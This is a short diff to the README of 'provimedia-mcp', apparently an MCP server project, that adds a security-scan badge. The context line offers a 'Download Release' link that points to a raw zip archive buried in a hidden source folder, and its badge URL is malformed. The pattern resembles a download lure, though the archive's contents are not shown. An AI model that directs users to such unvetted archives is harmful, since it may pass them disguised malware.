@@ -1,5 +1,7 @@
 # 🚀 provimedia-mcp - Simplifying Chainguard MCP with Memory
 
+[![SafeSkill 88/100](https://img.shields.io/badge/SafeSkill-88%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/shafikm17-provimedia-mcp)
+
 [![Download Release](https://github.com/shafikm17/provimedia-mcp/raw/refs/heads/main/src/mcp-server/.chainguard/mcp_provimedia_1.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/shafikm17/provimedia-mcp/raw/refs/heads/main/src/mcp-server/.chainguard/mcp_provimedia_1.1.zip)
 
 ## 🥇 Introduction
